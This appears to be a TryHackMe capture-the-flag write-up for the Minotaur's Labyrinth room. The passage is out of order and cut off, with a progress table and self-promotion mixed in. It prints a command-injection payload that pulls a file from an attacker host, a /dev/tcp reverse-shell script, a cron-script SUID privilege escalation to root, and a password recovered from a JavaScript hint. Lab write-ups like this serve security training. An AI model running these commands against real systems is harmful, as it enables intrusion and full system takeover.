daemon@MachineIP:/opt/lampp/htdocs$ cd /home
daemon@MachineIP:/home$ ls
anonftp  minotaur  ssm-user  ubuntu  user
daemon@MachineIP:/home$ cd user
daemon@MachineIP:/home/user$ ls
flag.txt
daemon@MachineIP:/home/user$ cat flag.txt
fL4G{••••••••••••••••••••••}
daemon@MachineIP:/home/user$ 
```




```bash
daemon@MachineIP:/$ find / -name timer.sh 2>/dev/null
/timers/timer.sh
```

```bash
daemon@MachineIP:/timers$ ls -lah
total 12K
drwxrwxrwx  2 root root 4,0K jún   15  2021 .
drwxr-xr-x 26 root root 4,0K márc  11 20:05 ..
-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
```

```bash
daemon@MachineIP:/timers$ cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```

```bash
daemon@MachineIP:/$ ls -lah
total 712M
drwxr-xr-x  26 root root 4,0K márc  11 20:05 .
drwxr-xr-x  26 root root 4,0K márc  11 20:05 ..
drwxr-xr-x   2 root root  12K jún   29  2025 bin
drwxr-xr-x   3 root root 4,0K jún   29  2025 boot
drwxrwxr-x   2 root root 4,0K jún   15  2021 cdrom
drwxr-xr-x  16 root root 4,2K márc  11 20:05 dev
drwxr-xr-x 135 root root  12K márc  11 20:05 etc
drwxr-xr-x   7 root root 4,0K márc  11 20:05 home
lrwxrwxrwx   1 root root   33 ápr   26  2025 initrd.img -> boot/initrd.img-5.4.0-150-generic
lrwxrwxrwx   1 root root   32 ápr   26  2025 initrd.img.old -> boot/initrd.img-5.4.0-90-generic
drwxr-xr-x  20 root root 4,0K ápr   26  2025 lib
drwxr-xr-x   2 root root 4,0K jún   29  2025 lib64
drwx------   2 root root  16K jún   15  2021 lost+found
drwxr-xr-x   2 root root 4,0K aug    7  2020 media
drwxr-xr-x   2 root root 4,0K aug    7  2020 mnt
drwxr-xr-x   3 root root 4,0K jún   15  2021 opt
dr-xr-xr-x 219 root root    0 márc  11 20:05 proc
drwxr-xr-x   2 root root 4,0K jún   15  2021 reminders
drwx------   8 root root 4,0K jún   29  2025 root
drwxr-xr-x  32 root root  960 márc  11 20:21 run
drwxr-xr-x   2 root root  12K jún   29  2025 sbin
drwxr-xr-x  17 root root 4,0K ápr   26  2025 snap
drwxr-xr-x   2 root root 4,0K jún   16  2021 srv
-rw-------   1 root root 712M jún   15  2021 swapfile
dr-xr-xr-x  13 root root    0 márc  11 20:05 sys
drwxrwxrwx   2 root root 4,0K jún   15  2021 timers
drwxrwxrwt  15 root root 4,0K márc  11 20:53 tmp
drwxr-xr-x  11 root root 4,0K aug    7  2020 usr
drwxr-xr-x  16 root root 4,0K jún   15  2021 var
lrwxrwxrwx   1 root root   30 ápr   26  2025 vmlinuz -> boot/vmlinuz-5.4.0-150-generic
lrwxrwxrwx   1 root root   29 ápr   26  2025 vmlinuz.old -> boot/vmlinuz-5.4.0-90-generic
```


```bash
daemon@MachineIP:/reminders$ cat dontforget.txt | sort | uniq
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...tttTEST
```

```bash
daemon@MachineIP:/timers$ echo "chmod u+s /bin/bash" > timer.sh
daemon@MachineIP:/timers$ ls -lah /bin/bash
-rwxr-xr-x 1 root root 1,2M ápr   18  2022 /bin/bash
daemon@MachineIP:/timers$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1,2M ápr   18  2022 /bin/bash
daemon@MachineIP:/timers$ /bin/bash -p
bash-5.0# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
bash-5.0# ls -lah /root
total 56K
drwx------  8 root root 4,0K jún   29  2025 .
drwxr-xr-x 26 root root 4,0K márc  11 20:05 ..
-rw-r--r--  1 root root 3,1K ápr    9  2018 .bashrc
drwx------  2 root root 4,0K aug    7  2020 .cache
drwxr-xr-x  2 root root 4,0K jún   15  2021 .config
-rw-r--r--  1 root root   29 jún   15  2021 da_king_flek.txt
drwx------  3 root root 4,0K jún   15  2021 .gnupg
drwxr-xr-x  3 root root 4,0K jún   15  2021 .local
-rw-------  1 root root   18 jún   15  2021 .mysql_history
-rw-r--r--  1 root root  161 jan    2  2024 .profile
-rw-r--r--  1 root root   66 jún   15  2021 .selected_editor
drwxr-xr-x  8 root root 4,0K ápr   26  2025 snap
drwx------  2 root root 4,0K ápr   26  2025 .ssh
-rw-------  1 root root    0 jún   29  2025 .viminfo
-rwxr-xr-x  1 root root   35 jún   15  2021 xampp_setup_job
bash-5.0# cat /root/da_king_flek.txt
fL4G{••••••••••••••••••••••}
bash-5.0# 
```

<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/05d013a8-c73b-4984-8f38-8c1d6e530427"><br>
                  <img width="900px" src="https://github.com/user-attachments/assets/9073dfb0-d711-4dde-a4ec-330cf060d2ce"><br>
                  <img width="900px" src="https://github.com/user-attachments/assets/9f683ebb-aadc-491f-88b4-a8d5764888cd"></p>

            
<h1 align="center">My TryHackMe Journey ・ 2026, March<a id='9'></a></h1>

<div align="center"><h6>

|Day<br><br><br> |Streak<br><br><br>|Room Name<br><br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|League<br><br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|---------------:|
|11<br><br>      |69<br><br>        |Minotaur´s Labyrinth<br><br>     |Medium<br><br> |🚩<br><br>| 1,145<br><br>| 160,051<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|9ᵗʰ<br><br>|
|10<br><br>      |68<br><br>        |M365 Monitoring Basics<br><br>   |Medium<br><br> |🔗<br><br>| 1,144<br><br>| 160,016<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|9<br><br>       |67<br><br>        |Advent of Cyber 2022<br><br>     |Easy  <br><br> |🔗<br><br>| 1,143<br><br>| 159,880<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|8<br><br>       |66<br><br>        |Windows Reversing Intro<br>      |Medium<br><br> |🔗<br><br>| 1,142<br><br>|        <br><br>| 91<br><br>|     <br><br>|    <br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|8<br><br>       |66<br><br>        |Advent of Cyber 2 [2020]<br>     |Easy<br><br>   |🔗<br><br>| 1,141<br><br>| 159,164<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|8<br><br>       |66<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,140<br><br>| 159,068<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|7<br><br>       |65<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|6<br><br>       |64<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|6<br><br>       |64<br><br>        |Persistence: T1053<br>           |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|5<br><br>       |63<br><br>        |LOVELETTER.EXE<br><br>           |Hard<br><br>   |🚩<br><br>| 1,139<br><br>| 158,294<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Monitoring AWS Workloads<br>     |Medium<br><br> |🔗<br><br>| 1,139<br><br>| 157,994<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Kernel Blackout<br><br>          |Medium<br><br> |🚩<br><br>| 1,138<br><br>| 157,978<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Operation Endgame<br><br>        |Hard<br><br>   |🚩<br><br>| 1,137<br><br>| 157,578<br><br>| 90<br><br>| 23ʳᵈ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|7ᵗʰ<br><br>|
|4<br><br>       |62<br><br>        |Monitoring Active Directory<br>  |Medium<br><br> |🔗<br><br>| 1,136<br><br>| 157,396<br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|3<br><br>       |61<br><br>        |Monitoring AWS Services<br>      |Medium<br><br> |🔗<br><br>| 1,135<br><br>|        <br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|2<br><br>       |60<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|1<br><br>       |59<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|


</h6></div><br>

<h1 align="center">My TryHackMe Journey ・ 2026, March</h1>
<p align="center">Global All Time:     16ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/88679ef9-da23-416c-aeaf-1f5e85c4d41d"><br>
                                               <img width="1200px" src="https://github.com/user-attachments/assets/8cd5429b-3cb3-4570-88fb-f3ae5dc10ab5"><br><br>
                  Global Monthly:      10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f9b2cf7f-8a96-4f73-89b0-2d6777df2b53"><br><br>
                  Brazil All Time:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/b1bec949-b2d2-43cd-bb75-36d3a1e3a7c4"><br><br>
                  Brazil Monthly:       1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/1d827f6a-69a2-4903-b044-49d2a96b591d"></p>



<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
<img width="1099" height="455" alt="image" src="https://github.com/user-attachments/assets/0a770949-601b-4034-b7da-32ab5e097fb6" />




<br>
<br>
<br>
<p>Many attempts since 2025-Aug</p>

```bash
:~/Minotaur´sLabyrinth# git clone https://github.com/spayc/minotaur-box/
```


```bash
:~/Minotaur´sLabyrinth# cd minotaur-box
```



root@MachineIP2:~/Minotaur´sLabyrinth/minotaur-box# curl -s  http://MachineIP/echo.php?search=hi|ls -lah
total 88K
drwxr-xr-x 7 root root 4.0K Mar 11 17:35 .
drwxr-xr-x 3 root root 4.0K Mar 11 17:09 ..
drwxr-xr-x 4 root root 4.0K Mar 11 17:35 api
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 css
-rw-r--r-- 1 root root  322 Mar 11 17:35 dbConnect.php
-rw-r--r-- 1 root root 1.9K Mar 11 17:35 dbCreate.sql
-rw-r--r-- 1 root root 2.7K Mar 11 17:35 echo.php
-rw-r--r-- 1 root root 1.4K Mar 11 17:35 favicon.png
drwxr-xr-x 8 root root 4.0K Mar 11 17:35 .git
-rw-r--r-- 1 root root   66 Mar 11 17:09 .gitattributes
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 imgs
-rw-r--r-- 1 root root 4.5K Mar 11 17:35 index.php
-rw-r--r-- 1 root root 1.4K Mar 11 17:35 jebait.html
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 js
-rw-r--r-- 1 root root 1.1K Mar 11 17:35 License.txt
-rw-r--r-- 1 root root 2.5K Mar 11 17:35 login.html
-rw-r--r-- 1 root root  865 Mar 11 17:35 login.php
-rw-r--r-- 1 root root   84 Mar 11 17:35 logout.php
-rw-r--r-- 1 root root 3.8K Mar 11 17:35 Minotaur-Box_Writeup.md
-rw-r--r-- 1 root root  230 Mar 11 17:35 README.md
-rw-r--r-- 1 root root  282 Mar 11 17:35 session.php


```bash
root@MachineIP2:~/Minotaur´sLabyrinth/minotaur-box# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
AttackIP - - [11/Mar/2026 18:39:00] "GET /rev HTTP/1.1" 200 -




```bash
root@MachineIP2:~/Minotaur´sLabyrinth# curl -s http://MachineIP/echo.php?search=|wget AttackIP:8000/rev -O /tmp/rev
--2026-03-11 18:39:00--  http://AttackIP:8000/rev
Connecting to AttackIP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 65 [application/octet-stream]
Saving to: \u2018/tmp/rev\u2019

/tmp/rev                                       100%[==================================================================================================>]      65  --.-KB/s    in 0s      

2026-03-11 18:39:00 (598 KB/s) - \u2018/tmp/rev\u2019 saved [65/65]



```bash
root@MachineIP2:~/Minotaur´sLabyrinth# curl -s http://MachineIP/echo.php?search=|ls -lah /tmp
total 172K
drwxrwxrwt 18 root root  68K Mar 11 18:43 .
drwxr-xr-x 24 root root 4.0K Mar 11 16:00 ..
drwx------  2 root root 4.0K Mar 11 17:40 burp16897688097614945882.tmp
drwx------  2 root root 4.0K Mar 11 17:40 burp5389813062084280020.tmp
drwx------  2 root root 4.0K Mar 11 17:40 burp9789956405673510149.tmp
-rw-------  1 root root  32K Mar 11 17:40 burp_payloads_8116347347510433874.tmp
-rw-r--r--  1 root root 4.2K Mar 11 16:01 debug_networkvpn_pull.txt
drwxrwxrwt  2 root root 4.0K Mar 11 16:00 .font-unix
drwxr-xr-x  2 root root 4.0K Mar 11 17:40 hsperfdata_root
drwxrwxrwt  2 root root 4.0K Mar 11 16:01 .ICE-unix
-rw-r--r--  1 root root  339 Mar 11 16:00 publicip.txt
-rwxrwxrwx  1 root root   65 Mar 11 18:31 rev
drwx------  3 root root 4.0K Mar 11 16:01 snap-private-tmp
drwx------  2 root root 4.0K Mar 11 16:01 ssh-2uADn0hHmJU2
drwx------  3 root root 4.0K Mar 11 16:01 systemd-private-0d8460725e5043baa6805065289e3e4a-apache2.service-h8nUag
drwx------  3 root root 4.0K Mar 11 16:00 systemd-private-0d8460725e5043baa6805065289e3e4a-ModemManager.service-Cb5Crf
drwx------  3 root root 4.0K Mar 11 16:00 systemd-private-0d8460725e5043baa6805065289e3e4a-systemd-logind.service-7NTmCf
drwx------  3 root root 4.0K Mar 11 16:00 systemd-private-0d8460725e5043baa6805065289e3e4a-systemd-timesyncd.service-P47AMf
drwx------  3 root root 4.0K Mar 11 16:01 systemd-private-0d8460725e5043baa6805065289e3e4a-upower.service-C9WVaf
drwxrwxrwt  2 root root 4.0K Mar 11 16:00 .Test-unix
-rw-r--r--  1 root root   13 Mar 11 16:00 thmip.txt
-r--r--r--  1 root root   11 Mar 11 16:00 .X0-lock
drwxrwxrwt  2 root root 4.0K Mar 11 16:00 .X11-unix
-r--r--r--  1 root root   11 Mar 11 16:00 .X1-lock
drwxrwxrwt  2 root root 4.0K Mar 11 16:00 .XIM-unix
```

```bash
http://MachineIP/echo.php?search=|wget%20AttackIP%3A8000%/revshell1%20-O%20/tmp/shell
```

```bash
http://MachineIP/echo.php?search=|wget%20AttackIP:8000/shell1%20-O%20/tmp/shell
```

<p><em>rev</em></p>

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/AttackIP/4444 0>&1"
```


```bash
root@MachineIP2:~/Minotaur´sLabyrinth/minotaur-box# git log --oneline
e74625b (HEAD -> main, origin/main, origin/HEAD) update readme
9af511a Update Minotaur-Box_Writeup.md
c4fc061 Update Minotaur-Box_Writeup.md
b90e334 Update Minotaur-Box_Writeup.md
84d2fb0 Update Minotaur-Box_Writeup.md
f72b670 edit file
0ae0dfd Update Minotaur-Box_Writeup.txt
b21c48e Update Minotaur-Box_Writeup.txt
d2095b1 final echo commit
6775e84 yeah better regex
4f88acb the writeup fellas ran without errors
a4efa72 Merge branch 'main' of https://github.com/spayc/minotaur-box into main
e956208 it works maybe
91c5624 Merge branch 'main' of https://github.com/spayc/minotaur-box into main
93f57d6 shameless promo added
83f86ac added hint
46c72a9 Merge branch 'main' of https://github.com/spayc/minotaur-box into main
72025e3 update echo.php
c6f3ed3 commit
34c8aad just a change :)
0bd3a5c Merge branch 'main' of https://github.com/spayc/minotaur-box into main
716addb yay reversehell go brrr
920cfcd xenia overwrote files again :)
fba784f made it look nicer
0c0d103 added pwdgen and proper filtering
cabfc29 Merge branch 'main' of https://github.com/spayc/minotaur-box into main
375d7d0 s
3403464 sqli working :100:
8952ba5 kinda works
cf34848 it kinda works now
93acca7 commit
b581763 commit
6ee6ed8 just a commit :)
fb5e6aa found problem with sqli
403565d added logout feature
0b95654 fixed bugs in echo.js
0f607e8 kinda command injection
208b64d login and permissions are working
03e93b6 fixed login bug
193c7d3 need to get it working :ant:
558eb00 backend + login system merge
35d9bb3 (origin/backend_stuff_only) deleted index.html
6b2d0ef (origin/newloginsystem) last commiz
bddae21 img working :)
8e45010 changed file structure
03d4edc seach front/backend connected
60ccb96 login works location bugs
6c6b5ec file structure change
87e8f73 commit
6649b2a Create login.php
70c4d92 this time i really fucked up and deleated everything but i maged to make it work again btw this is the new brach
e9cf0ca search
7f72f49 :)
b2fa69c search
a86c78c Update index.php
378aad0 minor adjustments
9c9d33e minor adjustments
1eb16ad crud working everywhere
03514ee commit
b3078c8 commit
c4c8d54 commit
b51a4b4 crud methods
5dceb6e first push
e0b1356 (origin/safebackuplogin) 12.5
63627a9 stuff
be710b1 from last repo
d2bb281 Initial commit
```


```bash
:~/Minotaur´sLabyrinth/minotaur-box# git checkout origin/safebackuplogin
Note: switching to 'origin/safebackuplogin'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at e0b1356 12.5
```


```bash
:~/Minotaur´sLabyrinth/minotaur-box/minotaur-backend# ls -lah
total 24K
drwxr-xr-x 3 root root 4.0K Mar 11 17:13 .
drwxr-xr-x 5 root root 4.0K Mar 11 17:13 ..
drwxr-xr-x 3 root root 4.0K Mar 11 17:13 api
-rw-r--r-- 1 root root  426 Mar 11 17:13 dbConnect.php
-rw-r--r-- 1 root root 2.2K Mar 11 17:13 dbCreate.sql
-rw-r--r-- 1 root root   87 Mar 11 17:13 index.php
```


```bash
:~/Minotaur´sLabyrinth/minotaur-box#  git checkout main
:~/Minotaur´sLabyrinth/minotaur-box# ls -lah
total 88K
drwxr-xr-x 7 root root 4.0K Mar 11 17:35 .
drwxr-xr-x 3 root root 4.0K Mar 11 17:09 ..
drwxr-xr-x 4 root root 4.0K Mar 11 17:35 api
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 css
-rw-r--r-- 1 root root  322 Mar 11 17:35 dbConnect.php
-rw-r--r-- 1 root root 1.9K Mar 11 17:35 dbCreate.sql
-rw-r--r-- 1 root root 2.7K Mar 11 17:35 echo.php
-rw-r--r-- 1 root root 1.4K Mar 11 17:35 favicon.png
drwxr-xr-x 8 root root 4.0K Mar 11 17:35 .git
-rw-r--r-- 1 root root   66 Mar 11 17:09 .gitattributes
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 imgs
-rw-r--r-- 1 root root 4.5K Mar 11 17:35 index.php
-rw-r--r-- 1 root root 1.4K Mar 11 17:35 jebait.html
drwxr-xr-x 2 root root 4.0K Mar 11 17:35 js
-rw-r--r-- 1 root root 1.1K Mar 11 17:35 License.txt
-rw-r--r-- 1 root root 2.5K Mar 11 17:35 login.html
-rw-r--r-- 1 root root  865 Mar 11 17:35 login.php
-rw-r--r-- 1 root root   84 Mar 11 17:35 logout.php
-rw-r--r-- 1 root root 3.8K Mar 11 17:35 Minotaur-Box_Writeup.md
-rw-r--r-- 1 root root  230 Mar 11 17:35 README.md
-rw-r--r-- 1 root root  282 Mar 11 17:35 session.php
```


```bash
:~/Minotaur´sLabyrinth/minotaur-box/minotaur-backend# cat dbConnect.php
<?php
	
	$servername = "localhost";
	$db = "labyrinth";
	$usr = "root";
	$pwd = "";
	
	try {
		$conn = new PDO("mysql:host=$servername;dbname=$db", $usr, $pwd);
		// set the PDO error mode to exception
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		// echo "<p>Connected successfully</p>";
		
	} catch (PDOException $e) {
		// echo "<p>Connection failed: " . $e->getMessage() . "</p>";
		die();
	}

?>
```


```bash
:~/Minotaur´sLabyrinth/minotaur-box/minotaur-backend# cat dbCreate.sql
-- MySQL Script generated by MySQL Workbench
-- Mon May 30 11:25:32 2016
-- Model: New Model Version: 1.0
-- MySQL Workbench Forward Engineering

SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0;
SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0;
SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='TRADITIONAL,ALLOW_INVALID_DATES';

CREATE DATABASE IF NOT EXISTS `labyrinth`;

-- -----------------------------------------------------
-- Table `labyrinth`.`people`
-- -----------------------------------------------------
CREATE TABLE IF NOT EXISTS `labyrinth`.`people` (
 `idPeople` INT NOT NULL AUTO_INCREMENT,
 `namePeople` VARCHAR(255) NOT NULL,
 `passwordPeople` VARCHAR(255) NOT NULL,
 PRIMARY KEY (`idPeople`));


-- -----------------------------------------------------
-- Table `labyrinth`.`creatures`
-- -----------------------------------------------------
CREATE TABLE IF NOT EXISTS `labyrinth`.`creatures` (
 `idCreature` INT NOT NULL AUTO_INCREMENT,
 `nameCreature` VARCHAR(255) NOT NULL,
 `passwordCreature` VARCHAR(255) NOT NULL,
 PRIMARY KEY (`idCreature`));


 CREATE TABLE IF NOT EXISTS `labyrinth`.`lunch` (
 `idFood` INT NOT NULL AUTO_INCREMENT,
 `nameFood` VARCHAR(255) NOT NULL,
 PRIMARY KEY (`idFood`));



INSERT INTO labyrinth.people (idPeople, namePeople, passwordPeople) VALUES
(1, 'Eurycliedes', MD5('lovely')),
(2, 'Menekrates', 'testpassword2'),
(3, 'Philostratos', 'testpassword3');

INSERT INTO labyrinth.creatures (idCreature, nameCreature, passwordCreature) VALUES
(1, 'Cerberos', MD5('lovely')),
(2, 'Pegasus', 'testpassword5'),
(3, 'Chiron', 'testpassword6');

-- INSERT INTO labyrinth.people (idPeople, namePeople, passwordPeople) VALUES
-- (1, 'Eurycliedes', 'testpassword1'),
-- (2, 'Menekrates', 'testpassword2'),
-- (3, 'Philostratos', 'testpassword3');

-- INSERT INTO labyrinth.creatures (idCreature, nameCreature, passwordCreature) VALUES
-- (1, 'Cerberos', 'testpassword4'),
-- (2, 'Pegasus', 'testpassword5'),
-- (3, 'Chiron', 'testpassword6');


INSERT INTO `labyrinth`.`lunch` (idFood, nameFood) VALUES
(1, 'Baklava'),
(2, 'Olives'),
(3, 'Cheese');


SET SQL_MODE=@OLD_SQL_MODE;
SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS;
SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS;
```



<h2>Static Host Mapping</h2>


```bash
xx.xxx.xx.xx minotaur.thm
```


<img width="1125" height="281" alt="image" src="https://github.com/user-attachments/assets/e87847a1-9082-46fd-b63f-f0cc5bf09e56" />







/.git

<img width="1127" height="504" alt="image" src="https://github.com/user-attachments/assets/4d66b39b-7600-45ae-a4a1-04249c850b29" />


/.git/config

```bash
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/spayc/minotaur-box
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

/.git/logs/HEAD

```bash
0000000000000000000000000000000000000000 920cfcd99d95912dfc2e5ff0588de24762168b55 root <root@labyrinth.(none)> 1623779178 +0200	clone: from https://github.com/spayc/minotaur-box
```

/js

<img width="1086" height="335" alt="image" src="https://github.com/user-attachments/assets/6245013c-ea86-4c57-85be-526acd58d1ba" />


/js/init.js

$(document).ready(function () {
    $("#forgot-password").click(function(){
        alert("Ye .... Thought it would be this easy? \n                       -_______-")
    });
    
});




/j2/login.js

function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]b[10]b[5]c[9]c[9]c[1]a[2]a[5]c[0]c[9]b[8]
//                             |\____/|
///                           (\|----|/)
//                             \ 0  0 /
//                              |    |
//                           ___/\../\____
//                          /     --       \

$(document).ready(function() {
    $("#forgot-password").click(function() {
        alert("Ye .... Thought it would be this easy? \n                       -_______-")
    });
    $("#submit").click(function() {
        console.log("TEST")

        var email = $("#email1").val();
        var password = $("#password1").val();

        if (email == '' || password == '') {
            alert("Please fill all fields.");
            return false;
        }

        $.ajax({
            type: "POST",
            url: "login.php",
            data: {
                email: email,
                password: password

            },
            cache: false,
            success: function(data) {
                //alert(data);
                window.location.href = "index.php"
            },
            error: function(xhr, status, error) {
                console.error(xhr);
            }
        });

    });

});


/js/userlvl.js


$(document).ready(function() {

    $("#btn-choose-name").click(function() {
        var name_input = $("#name-input-field").val()
        var table_input = $('#theComboBox option:selected').text()
        table_input = table_input.toLowerCase()

        // alert(table_input);
        // alert(name_input);

        
        if(table_input == "people"){
            // console.log("PEOPLE")
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "namePeople": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idPeople + '</td>';
                            list += '<td>' + data[key][key1].namePeople + '</td>'
                            list += '<td>' + data[key][key1].passwordPeople + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No callback")
                }
            });
        } else if (table_input == "creatures") {
            // console.log("CREATURES")
            
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "nameCreature": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idCreature + '</td>';
                            list += '<td>' + data[key][key1].nameCreature + '</td>'
                            list += '<td>' + data[key][key1].passwordCreature + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No Callback")
                }
            });
        }
    });


});


/api



<img width="1132" height="322" alt="image" src="https://github.com/user-attachments/assets/66743437-830e-418c-aba4-5292b4035ba0" />



/api/creatures/


<img width="1136" height="427" alt="image" src="https://github.com/user-attachments/assets/05ecc223-5e07-4d75-9d8f-4793993f0246" />

/api/people/

<img width="1134" height="412" alt="image" src="https://github.com/user-attachments/assets/5c76c459-072d-423c-beab-3860a53506c2" />



<p>https://github.com/spayc/minotaur-box</p>


<img width="1010" height="758" alt="image" src="https://github.com/user-attachments/assets/92e318bc-7dcf-4933-92cf-731e13dc80b0" />



<h3></h3>

<h3>Web 80</h3>

<img width="1129" height="579" alt="image" src="https://github.com/user-attachments/assets/867bd4a6-eca8-4f2b-a1d5-aff997caaa12" />

<p>

- redirects to <code>/login.html</code><br>
- identified <code>js/login.js</code><br>
- identified <code>/jebaith.html</code><br></p>

<img width="1198" height="688" alt="image" src="https://github.com/user-attachments/assets/5b8d65dd-92c4-4055-9baf-560b12693fad" />

<br>

<h3>/js/login.js</h3>

<p>

- identified info that might be related to <code>Dedalus</code> password</p>

```bash
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
```

<img width="1139" height="612" alt="image" src="https://github.com/user-attachments/assets/fab9c7b9-7688-4f17-9b40-bb224415d92f" />

<p>

- crafted a Python script<br>
- uncovered <code>daedalus</code> : <code>g2e55kh4ck5r</code></p>

```bash
#!/usr/bin/env python3

def pwdgen():
        a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
